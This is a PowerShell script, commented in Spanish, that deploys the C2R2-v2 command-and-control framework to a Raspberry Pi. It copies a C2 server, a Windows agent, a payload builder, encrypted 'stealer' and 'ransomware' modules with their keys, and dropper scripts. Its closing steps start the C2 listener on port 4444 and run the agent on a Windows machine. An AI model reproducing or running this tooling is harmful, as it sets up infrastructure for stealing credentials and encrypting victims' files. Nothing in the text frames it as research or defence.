<#
.SYNOPSIS
    Deploy C2R2 server and tools to Raspberry Pi
.DESCRIPTION
    Copies the compiled binaries to Raspberry Pi via SCP
.PARAMETER PiHost
    Raspberry Pi hostname or IP address
.PARAMETER PiUser
    SSH username (default: grunt)
.PARAMETER DestPath
    Destination path on Pi (default: ~/Desktop/C2R2-v2)
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$PiHost,
    
    [Parameter(Mandatory=$false)]
    [string]$PiUser = "grunt",
    
    [Parameter(Mandatory=$false)]
    [string]$DestPath = "~/Desktop/C2R2-v2"
)

function Write-Color {
    param([string]$Text, [string]$Color = "White")
    $colors = @{
        "Red" = [ConsoleColor]::Red
        "Green" = [ConsoleColor]::Green
        "Yellow" = [ConsoleColor]::Yellow
        "Blue" = [ConsoleColor]::Blue
        "Cyan" = [ConsoleColor]::Cyan
        "Magenta" = [ConsoleColor]::Magenta
        "White" = [ConsoleColor]::White
    }
    Write-Host $Text -ForegroundColor $colors[$Color]
}

Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
Write-Color "   🚀 C2R2-v2 Deployment Tool - Raspberry Pi" Cyan
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
Write-Color ""

# Verificar que existen los binarios
$distPath = "dist"
if (-not (Test-Path $distPath)) {
    Write-Color "❌ Error: directorio 'dist' no encontrado. Ejecuta build-all.ps1 primero." Red
    exit 1
}

# Verificar archivos necesarios
$requiredFiles = @(
    "dist/c2r2-server-arm64",
    "dist/agent.exe",
    "builder/builder-linux-arm64",
    "modules/stealer.enc",
    "modules/stealer.key",
    "modules/ransomware.enc",
    "modules/ransomware.key"
)

foreach ($file in $requiredFiles) {
    if (-not (Test-Path $file)) {
        Write-Color "❌ Error: archivo no encontrado: $file" Red
        Write-Color "   Ejecuta build-all.ps1 primero para generar los binarios." Yellow
        exit 1
    }
}

Write-Color "✓ Todos los archivos necesarios encontrados" Green
Write-Color ""

# Crear estructura de directorios en el Pi
Write-Color "📁 Creando estructura de directorios en $PiUser@$PiHost`:$DestPath..." Cyan
$sshCmd = "mkdir -p $DestPath/{server,agent,builder,modules,team-client,dropper/scripts}"
ssh "$PiUser@$PiHost" $sshCmd

if ($LASTEXITCODE -ne 0) {
    Write-Color "❌ Error conectando al Raspberry Pi" Red
    Write-Color "   Verifica que SSH esté configurado correctamente" Yellow
    exit 1
}

Write-Color "✓ Estructura de directorios creada" Green
Write-Color ""

# Copiar archivos usando SCP
Write-Color "📦 Copiando archivos al Raspberry Pi..." Cyan

# Server
Write-Color "  → Copiando servidor ARM64..." Yellow
scp "dist/c2r2-server-arm64" "$PiUser@$PiHost`:$DestPath/server/"
ssh "$PiUser@$PiHost" "chmod +x $DestPath/server/c2r2-server-arm64"

# Agent (pre-compiled)
Write-Color "  → Copiando agente Windows pre-compilado..." Yellow
scp "dist/agent.exe" "$PiUser@$PiHost`:$DestPath/agent/"

# Builder
Write-Color "  → Copiando builder ARM64..." Yellow
scp "builder/builder-linux-arm64" "$PiUser@$PiHost`:$DestPath/builder/"
ssh "$PiUser@$PiHost" "chmod +x $DestPath/builder/builder-linux-arm64"

# Modules
Write-Color "  → Copiando módulos encriptados..." Yellow
scp "modules/stealer.enc" "modules/stealer.key" "$PiUser@$PiHost`:$DestPath/modules/"
scp "modules/ransomware.enc" "modules/ransomware.key" "$PiUser@$PiHost`:$DestPath/modules/"

# Agent config file
Write-Color "  → Copiando configuración del agente..." Yellow
scp "agent/src/config.rs" "$PiUser@$PiHost`:$DestPath/agent/src/"

# Team client
if (Test-Path "team-client/c2r2_team_client.py") {
    Write-Color "  → Copiando team client..." Yellow
    scp "team-client/c2r2_team_client.py" "$PiUser@$PiHost`:$DestPath/team-client/"
}

# Dropper scripts
if (Test-Path "dropper/scripts") {
    Write-Color "  → Copiando scripts de dropper..." Yellow
    scp -r "dropper/scripts/*" "$PiUser@$PiHost`:$DestPath/dropper/scripts/"
}

# README
if (Test-Path "README.md") {
    scp "README.md" "$PiUser@$PiHost`:$DestPath/"
}

Write-Color ""
Write-Color "✅ Deployment completado exitosamente!" Green
Write-Color ""
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
Write-Color "📋 Próximos pasos:" Cyan
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
Write-Color ""
Write-Color "1. Conectar al Raspberry Pi:" Yellow
Write-Color "   ssh $PiUser@$PiHost" White
Write-Color ""
Write-Color "2. Navegar al directorio:" Yellow
Write-Color "   cd $DestPath" White
Write-Color ""
Write-Color "3. Iniciar el servidor C2:" Yellow
Write-Color "   ./server/c2r2-server-arm64 --bind 0.0.0.0 --port 4444" White
Write-Color ""
Write-Color "4. En Windows, ejecutar el agente:" Yellow
Write-Color "   .\dist\agent.exe" White
Write-Color ""
Write-Color "5. Para generar nuevos agentes con IP diferente:" Yellow
Write-Color "   NO uses ./builder/builder-linux-arm64 en el Pi" Magenta
Write-Color "   En su lugar, usa build-all.ps1 en Windows con -ServerIP" Magenta
Write-Color ""
Write-Color "Documentación completa: https://github.com/G4sp4rCS/C2R2-v2" Cyan
Write-Color ""
